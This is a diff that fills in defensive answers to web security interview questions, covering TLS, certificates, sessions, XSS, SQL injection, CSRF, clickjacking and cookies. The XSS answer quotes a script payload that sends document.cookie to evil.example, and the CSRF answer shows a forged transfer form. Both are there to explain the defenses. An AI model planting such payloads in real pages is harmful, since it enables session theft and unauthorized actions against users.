@@ -1,6 +1,6 @@
 # Web security — Interview
 
-Web security interview questions, answers not filled in.
+Answers are filled for the published subset; the rest are still empty.
 
 [← Back to hub](./7_special.md)
 
@@ -27,6 +27,26 @@ Questions from [Devinterview.io — Web Security](https://devinterview.io/questi
 
 **Definition:**
 
+Web security is the set of controls that keep a site’s data confidential, intact, and available to the people who are allowed to use it.
+
+**How it works:**
+
+- Confidentiality means only authorized parties can read the data. Integrity means they can detect a change. Availability means the service is up when it should be.
+- TLS encrypts the transport and lets the client check the server’s identity.
+- Authentication establishes who the caller is. Authorization decides what that caller may do.
+- Response headers narrow what the browser will do: `X-Content-Type-Options: nosniff` stops MIME sniffing, `X-Frame-Options` or CSP `frame-ancestors` stops framing, and `Content-Security-Policy` limits where scripts may load from. The old `X-XSS-Protection` header is retired. Do not rely on it.
+- Treat every request body, query string, and header as data. Encode it on output, and send queries with parameters so user text cannot become SQL or HTML.
+- State-changing requests need a CSRF token the attacker’s page cannot read. Session cookies need `Secure`, `HttpOnly`, and a sensible `SameSite`, and the session id should change when the user signs in.
+
+**Examples:**
+
+```text
+Strict-Transport-Security: max-age=63072000
+X-Content-Type-Options: nosniff
+Content-Security-Policy: default-src 'self'
+X-Frame-Options: DENY
+```
+
 </details>
 
 <details>
@@ -35,6 +55,23 @@ Questions from [Devinterview.io — Web Security](https://devinterview.io/questi
 ### Can you explain what HTTPS is and how it differs from HTTP?
 
 **Definition:**
+
+HTTPS is HTTP inside TLS. The request and response have the same shape as HTTP, and the bytes on the wire are encrypted and checked.
+
+**How it works:**
+
+- TLS provides encryption, a certificate the client can validate, and an integrity check on each record.
+- HTTP is cleartext and conventionally uses port 80. HTTPS uses port 443. Browsers mark plain HTTP as not secure, and HTTPS is what you want for anything that is not a toy.
+- The handshake agrees a TLS version and a cipher suite, checks the certificate against a trusted authority, and derives fresh traffic keys. Modern suites use ephemeral Diffie-Hellman, so a later theft of the server’s private key does not decrypt old sessions.
+- A certificate authority issues the certificate. The public-key infrastructure is the set of authorities, certificates, and revocation data browsers trust.
+- The extra round trips cost a little latency. Session resumption and HTTP/2 make up much of that on later requests.
+
+**Examples:**
+
+```text
+http://shop.example/cart    cleartext, port 80
+https://shop.example/cart   TLS, port 443
+```
 
 </details>
 
@@ -45,6 +82,20 @@ Questions from [Devinterview.io — Web Security](https://devinterview.io/questi
 
 **Definition:**
 
+SSL and TLS are protocols that wrap a connection so the two ends can authenticate, encrypt, and detect tampering. TLS is the protocol you deploy. SSL 2.0 and 3.0 are obsolete and must be disabled.
+
+**How it works:**
+
+- The server presents a certificate. The client checks the name, the dates, and the chain up to a trust anchor.
+- After the handshake, traffic uses symmetric encryption such as AES. Public-key operations are used to authenticate and to agree the symmetric key, because they are slower.
+- A hash such as SHA-256 is part of the integrity construction. A changed byte fails the check and the connection stops.
+- Forward secrecy is a property of suites that use a fresh ephemeral key (ECDHE). It is not automatic in every historical cipher suite. RC4 and other broken algorithms are not acceptable.
+- TLS 1.2 and 1.3 are the versions to allow. The handshake negotiates downward only as far as you configured, so disable the old versions rather than hoping the client will choose well.
+
+**Examples:**
+
+A browser lock icon means the certificate checked out and the requests on that page are using TLS. It does not mean the application is free of injection bugs.
+
 </details>
 
 <details>
@@ -53,6 +104,26 @@ Questions from [Devinterview.io — Web Security](https://devinterview.io/questi
 ### How do SSL certificates work, and what is the purpose of a Certificate Authority (CA)?
 
 **Definition:**
+
+An SSL/TLS certificate binds a public key to a name. A certificate authority signs that binding so a browser can trust it without having met the server before.
+
+**How it works:**
+
+- The handshake agrees algorithms and derives traffic keys. The certificate is how the client knows the public key belongs to the name in the URL.
+- The authority checks the requester’s control of the name (and, for stricter certificates, the organization), signs the certificate, and can later revoke it.
+- A certificate carries the issuer, the validity window, the subject (the name), the public key, and the issuer’s signature over those fields.
+- PEM is the Base64 text form you paste into configs. DER is the binary encoding of the same structure.
+- A self-signed certificate is signed by its own key. It is fine for a local test and useless for public users, because their browsers do not trust you. A publicly trusted certificate comes from an authority already in the browser’s trust store.
+
+**Examples:**
+
+```text
+subject: shop.example
+issuer: Example CA
+public key: (server key)
+not after: 2027-04-01
+signature: signed by Example CA
+```
 
 </details>
 
@@ -63,6 +134,22 @@ Questions from [Devinterview.io — Web Security](https://devinterview.io/questi
 
 **Definition:**
 
+Encryption is reversible if you have the key. Hashing is one-way: it maps data to a fixed-length digest, and you cannot recover the input from the digest.
+
+**How it works:**
+
+- Encrypt when someone who holds the key must read the data later: a message, a disk, a TLS record.
+- Hash when you need to detect a change or to store a password check without storing the password. Verification hashes the new input and compares digests.
+- A password store uses a slow, salted password hash (bcrypt, scrypt, or Argon2), not a fast checksum such as plain SHA-256.
+- The same input and key always produce the same ciphertext. A hash of equal inputs matches. A one-bit change in the input should change the digest widely.
+
+**Examples:**
+
+```text
+encrypt("invoice 42", key) → ciphertext that decrypt(key) turns back
+hash("invoice 42")         → digest you can compare, not decrypt
+```
+
 </details>
 
 <details>
@@ -71,6 +158,23 @@ Questions from [Devinterview.io — Web Security](https://devinterview.io/questi
 ### Define the concept of a secure session and explain how it is established.
 
 **Definition:**
+
+A secure session is a stretch of requests the server treats as one authenticated user, protected so an outsider cannot read it or forge the next request.
+
+**How it works:**
+
+- On the wire, TLS agrees traffic keys for that connection. Modern handshakes derive them with ephemeral Diffie-Hellman. The server proves its name with a certificate. The client’s public key is not what encrypts a session key. Older RSA key transport did encrypt a premaster secret to the server’s public key, and that mode is obsolete.
+- The keys must be unpredictable and long enough. AES-128 is a common floor for the traffic key. A fresh ephemeral key gives forward secrecy: compromising the server’s long-term key later does not open this session.
+- In the application, the server stores the user’s state and sends only a random session id, usually in a cookie. Regenerating that id at login closes fixation. A separate CSRF token, or a `SameSite` cookie plus a custom header, stops another site from riding the session.
+- Short-lived tokens are the same idea in APIs: the token names the grant, and it expires.
+
+**Examples:**
+
+```text
+Set-Cookie: sid=8f3c…; Secure; HttpOnly; SameSite=Lax
+```
+
+The browser stores `sid`. JavaScript cannot read it. The server looks `sid` up and finds the user.
 
 </details>
 
@@ -81,6 +185,25 @@ Questions from [Devinterview.io — Web Security](https://devinterview.io/questi
 
 **Definition:**
 
+The weaknesses that show up again and again are injection, cross-site scripting, broken authentication, misconfiguration, insecure object references, cross-site request forgery, and open redirects.
+
+**How it works:**
+
+- SQL injection happens when user text is concatenated into a query. `1 OR 1=1` changes the condition. Send the value as a parameter, or let a query builder do that. Do not assemble SQL by joining strings.
+- XSS happens when user text is written into HTML or JavaScript without encoding, so `<script>` runs in a victim’s browser. Encode on output for the context, and set a Content Security Policy.
+- Broken authentication is guessable passwords, session ids in URLs, or a session that never rotates. Store a slow password hash, and set `HttpOnly` and `Secure` on the session cookie.
+- Misconfiguration is a default admin password, a stack trace in production, or a storage bucket left public. Review the deployed settings and grant the least privilege that works.
+- An insecure direct object reference is `/invoices/42` with no check that this user owns invoice 42. Authorize the object, and do not treat the id as a secret.
+- CSRF is a site the victim visits, causing the victim’s browser to send the victim’s cookies to your site. Require a token on state-changing requests.
+- An open redirect sends the browser to whatever URL arrived in a parameter. Allow only relative paths or a fixed list of hosts.
+
+**Examples:**
+
+```text
+GET /invoices/42          must check the caller owns 42
+GET /next?url=https://evil.example   must not redirect there
+```
+
 </details>
 
 <details>
@@ -89,6 +212,24 @@ Questions from [Devinterview.io — Web Security](https://devinterview.io/questi
 ### Can you explain the Cross-Site Scripting (XSS) attack and how to prevent it?
 
 **Definition:**
+
+Cross-site scripting runs an attacker’s script in a victim’s browser, in the origin of a site that trusted the attacker’s text.
+
+**How it works:**
+
+- The script can read the DOM, act as the user, rewrite the page, or send the user somewhere else. A cookie marked `HttpOnly` is not readable from that script. A cookie without the flag is.
+- Stored XSS saves the payload, for example in a comment, and runs it for everyone who opens the page. Reflected XSS returns the payload in the response to the request that carried it. DOM XSS is assembled by client-side code from a URL or another browser input.
+- The durable fix is output encoding for the context: HTML text, an attribute, or JavaScript are not the same encoding. A Content Security Policy that does not allow inline scripts limits what a missed encoding can do.
+- Validate input when you know the shape (an integer, a date). Validation is not a substitute for encoding. `HttpOnly` and `Secure` on cookies shrink the payoff.
+- Review places where HTML is built from data. Do not execute untrusted markup in order to “see what it does” outside a sandbox.
+
+**Examples:**
+
+```text
+comment: <script>fetch('https://evil.example/?c='+document.cookie)</script>
+```
+
+Stored as text and inserted with the HTML escaped, the browser shows the tags. Inserted as HTML, it runs.
 
 </details>
 
@@ -99,6 +240,26 @@ Questions from [Devinterview.io — Web Security](https://devinterview.io/questi
 
 **Definition:**
 
+SQL injection is user input that the database executes as SQL, because the application glued that input into the statement text.
+
+**How it works:**
+
+- The usual entry is a form field or a query parameter. The attacker closes the intended condition and adds their own, to read rows, change them, or run a second statement where the engine allows it.
+- A parameterized statement, or prepared statement, keeps the SQL text fixed and sends the value separately. The engine never parses the value as syntax.
+- A stored procedure helps only if it also receives parameters. A procedure that concatenates a string internally is still injectable.
+- An ORM or query builder is safe when you use its parameter API. It is not safe when you pass it a raw fragment.
+- Rejecting unexpected characters is a backup. It is not the control you depend on, because a missed character class is a bypass.
+
+**Examples:**
+
+```python
+# the value cannot change the statement
+cursor.execute(
+    "SELECT id FROM invoices WHERE customer_id = %s",
+    (customer_id,),
+)
+```
+
 </details>
 
 <details>
@@ -107,6 +268,27 @@ Questions from [Devinterview.io — Web Security](https://devinterview.io/questi
 ### Describe what Cross-Site Request Forgery (CSRF) is and how to prevent it.
 
 **Definition:**
+
+Cross-site request forgery makes a victim’s browser send a state-changing request to a site where the victim is already signed in. The browser attaches the cookies. The victim did not mean to send the request.
+
+**How it works:**
+
+- The victim opens the attacker’s page while a session cookie for your site is still stored. The page submits a form, or loads a URL, aimed at your site. The same-origin policy does not stop that request. It stops the attacker’s script from reading the response.
+- The synchronizer token is a random value in the form or header that the server checks. The attacker’s page cannot read it from your origin, so it cannot supply a matching token.
+- A cookie that is not the session cookie, echoed back in a header (double submit), is the same idea when script on your origin can read that cookie and script on the other origin cannot.
+- `SameSite=Lax` or `Strict` stops many cross-site cookie submissions. It is not a complete substitute for a token on APIs that other sites are meant to call.
+- Ask the user to confirm an irreversible action. Serve the site only over HTTPS so the cookie is not stolen on the way, which is a different problem.
+
+**Examples:**
+
+```html
+<!-- on evil.example, while the victim is signed in at shop.example -->
+<form action="https://shop.example/transfer" method="POST">
+  <input name="to" value="attacker">
+</form>
+```
+
+The form needs a token the attacker cannot see, or the cookie must not be sent on this cross-site POST.
 
 </details>
 
@@ -117,6 +299,24 @@ Questions from [Devinterview.io — Web Security](https://devinterview.io/questi
 
 **Definition:**
 
+The same-origin policy is the browser rule that a document may freely read another document only when the protocol, host, and port all match.
+
+**How it works:**
+
+- `https://shop.example` and `https://shop.example` match. `http://shop.example`, `https://other.example`, and `https://shop.example:8443` do not.
+- Because of that, a malicious page cannot read your account page or your response bodies just because both tabs are open.
+- It limits what a script can do with another origin. It does not by itself stop that origin from receiving a request, which is why CSRF still needs a token.
+- Cookies are not sent to a different host, so one origin does not receive another origin’s session cookie. That is separate from XSS on the origin that owns the cookie.
+- CORS is how a server opts in to specific cross-origin reads. An iframe can embed another page, and the parent still cannot read the frame’s document unless the origins match.
+- Subdomains are different hosts. Older browsers were less consistent. Systems that are meant to be called from many web origins have to say so explicitly. They do not get a free pass.
+
+**Examples:**
+
+```text
+https://shop.example/app  and  https://shop.example/api   same origin
+https://shop.example      and  https://cdn.shop.example   different hosts
+```
+
 </details>
 
 <details>
@@ -125,6 +325,23 @@ Questions from [Devinterview.io — Web Security](https://devinterview.io/questi
 ### What is Clickjacking, and what measures can prevent it?
 
 **Definition:**
+
+Clickjacking is a page that frames your site, hides the frame, and lines your buttons up under something the user meant to click.
+
+**How it works:**
+
+- A transparent iframe, or a positioned layer, sits over a harmless-looking control. The click lands on your framed page.
+- Drag-and-drop variants trick the user into moving data onto the attacker’s target.
+- Send `Content-Security-Policy: frame-ancestors 'none'`, or `'self'` if you frame yourself. `X-Frame-Options: DENY` (or `SAMEORIGIN`) is the older header that still helps where CSP is ignored.
+- A frame-busting script that navigates the top window away is a weak backup. It fails when scripting is restricted, and the header is the control that works with scripts off.
+- The pointer-lock API is not a clickjacking defense.
+
+**Examples:**
+
+```text
+Content-Security-Policy: frame-ancestors 'none'
+X-Frame-Options: DENY
+```
 
 </details>
 
@@ -135,6 +352,21 @@ Questions from [Devinterview.io — Web Security](https://devinterview.io/questi
 
 **Definition:**
 
+A cookie becomes a security problem when stealing it, reading it from script, or stuffing it with sensitive data lets someone else act as the user.
+
+**How it works:**
+
+- Session hijacking is the use of a stolen session id. Mark the cookie `Secure` so it is only sent over HTTPS, and `HttpOnly` so page script cannot read it. Issue a new id when the user authenticates, and expire idle sessions.
+- XSS is the usual way script steals a cookie that lacks `HttpOnly`. Encoding output and a Content Security Policy are the fixes. The cookie flags only limit the damage.
+- Do not put passwords, personal data, or authorization decisions in the cookie. Store a random id and keep the data on the server. If you must put a value in the cookie, sign it or encrypt it and treat the client as able to see it anyway if script can read it.
+- The `__Host-` prefix requires `Secure`, a path of `/`, and no `Domain`, so a subdomain cannot plant the cookie. `__Secure-` requires `Secure`.
+
+**Examples:**
+
+```text
+Set-Cookie: __Host-sid=8f3c…; Secure; HttpOnly; Path=/; SameSite=Lax
+```
+
 </details>
 
 <details>
@@ -144,6 +376,24 @@ Questions from [Devinterview.io — Web Security](https://devinterview.io/questi
 
 **Definition:**
 
+A man-in-the-middle attack is someone on the path between two parties who reads or changes the traffic and, if the parties do not authenticate each other, pretends to be one of them.
+
+**How it works:**
+
+- Open Wi-Fi, a spoofed site, and a tampered mail path are common places this happens.
+- TLS with a checked certificate closes the web case: the attacker does not have a certificate for your name that the client’s trust store accepts, so the handshake fails.
+- HSTS tells the browser to use HTTPS for your host even when a link says HTTP, which blocks a downgrade. Certificate pinning, mostly in native apps, refuses any certificate other than the ones you shipped.
+- On the local network, 802.1X authenticates devices before they get access, and WPA2 or WPA3 protects the wireless link. An intrusion detection or prevention system watches for the odd traffic that remains.
+- A lock icon you trained users to ignore, or a certificate warning you trained them to click through, undoes the protocol.
+
+**Examples:**
+
+```text
+Strict-Transport-Security: max-age=63072000; includeSubDomains
+```
+
+After the first HTTPS visit, the browser refuses a cleartext retry of that host.
+
 </details>
 
 <details>
@@ -152,6 +402,26 @@ Questions from [Devinterview.io — Web Security](https://devinterview.io/questi
 ### Describe the concept of session management in web security.
 
 **Definition:**
+
+Session management is how a server remembers a user across HTTP requests, which are otherwise independent, and how it stops someone else from using that memory.
+
+**How it works:**
+
+- The server keeps the data. The client keeps only an identifier. Cookies are the usual carrier. Putting the id in the URL, in a hidden form field, or in a custom header leaks it into logs, referrers, or script.
+- The identifier must be long and random. Predictable ids are session prediction.
+- Hijacking uses a stolen id. Fixation plants an id the attacker already knows and waits for the victim to sign in on it. Regenerating the id at login closes fixation.
+- CSRF rides a real session. A token or `SameSite` addresses that. A loose CORS configuration that reflects any origin and allows credentials lets another site read authenticated responses.
+- Use TLS, set `Secure` and `HttpOnly`, expire idle sessions, and check the session on the server for every protected action. A weak TLS configuration undermines the cookie flags.
+
+**Examples:**
+
+```text
+sign-in succeeds
+  → discard the anonymous sid
+  → Set-Cookie: sid=<new random>; Secure; HttpOnly; SameSite=Lax
+idle 30 minutes
+  → forget that sid on the server
+```
 
 </details>
 
